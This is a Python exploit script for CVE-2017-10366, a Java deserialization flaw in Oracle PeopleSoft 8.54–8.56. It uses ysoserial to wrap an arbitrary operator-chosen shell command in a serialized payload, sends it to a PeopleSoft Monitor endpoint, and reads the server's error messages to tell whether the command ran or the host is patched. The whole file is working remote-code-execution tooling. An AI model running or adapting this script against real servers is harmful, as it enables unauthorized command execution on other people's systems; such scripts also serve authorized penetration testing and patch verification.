#!/usr/bin/python
# CVE-2017-10366: Oracle PeopleSoft 8.54, 8.55, 8.56 Java deserialization exploit
#
# This script automates the exploitation of a Java deserialization vulnerability
# in Oracle PeopleSoft, originally discovered by Vahagn Vardanyan.
#
# This exploit requires ysoserial.jar to generate cross-platform # serialized
# Java payloads. ysoserial must be in the same directory as this script.
#
# written by Julio Cesar Fort
# Copyright 2016-2018, Blaze Information Security

import argparse
import subprocess
from subprocess import PIPE
import os
import requests
import random
import string
import sys

ERROR = -1

def main():
    parser = argparse.ArgumentParser(description='CVE-2017-10366: Oracle PeopleSoft Java deserialization exploit')
    parser.add_argument('--url', action='store', dest='url', help='Full URL also containing the monitor name/ID. - e.g., http://peoplesoft/monitor/monitor_name')
    parser.add_argument('--gadget', action='store', dest='gadget', help='Gadget for deserialization - default: CommonsCollections5')
    parser.add_argument('--platform', action='store', dest='platform', help='Target platform - must be either powershell, cmd (Windows) or bash (Unix)')
    parser.add_argument('--cmd', action='store', dest='cmd', help='Command to execute on the affected host - default: nslookup google.com')
    
    args = parser.parse_args()
    
    if not args.url:
        print("[!] ERROR: PeopleSoft Monitor URL not supplied.")
        sys.exit(ERROR)
        
    if not args.platform:
        print("[!] ERROR: Target shell not supplied. Must be either 'bash', 'cmd' or 'powershell'.")
        sys.exit(ERROR)
    else:
        if args.platform == "powershell":
            target_platform = "powershell"
        elif args.platform == "bash":
            target_platform = "bash"
        elif args.platform == "cmd":
            target_platform = "cmd"
        else:
            print("[!] ERROR: Unknown platform '%s'" % args.platform)
            sys.exit(ERROR)
        
    if not args.gadget:
        print("[+] Using 'CommonsCollections5' as default gadget.")
        args.gadgets = 'CommonsCollections5'
        
    if not args.cmd:
        args.cmd = 'nslookup google.com'
        print("[+] Using 'nslookup google.com' as default command.")
    
    ysoserial_args = []
    ysoserial_args = ['java', '-jar', 'ysoserial-modified.jar',
                      args.gadgets, target_platform, args.cmd]
    
    try:
        payload = subprocess.Popen(ysoserial_args, stdin=PIPE, stdout=PIPE).communicate()[0]
    except OSError as err:
        print("[!] Error opening ysoserial: %s" % str(err))
        sys.exit(ERROR)
    
    ysoserial_payload = payload
    
    req = requests.post(args.url, data=ysoserial_payload, verify=False)
    
    if "Monitor not activated" in req.reason:
        print("[*] Payload executed successfully!")
        
    elif "The method 'exec'" in req.reason:
        print("[*] Target seems vulnerable but platform may be incorrect.")
            
    elif "invalid stream header" in req.reason:
        print("[*] Target may be vulnerable but serialization payload seems incorrect. Try changing the gadget.")
    
    elif "Unauthorized deserialization attempt" in req.reason:
        print("[!] Target is patched.")
        
    elif "Serialization support for" in req.reason:
        print("[!] Target seems to be patched - Deserialization was disabled.")
        
    elif "Site name is not valid" in req.reason:
        print("[!] Monitor ID invalid.")
    
    else:
        print("[!] Exploit failed. Are you sure the Monitor ID is valid? See the response from PeopleSoft for more information.")
        print("--------------------------------------")
        print(req.text)

if __name__ == '__main__':
    main()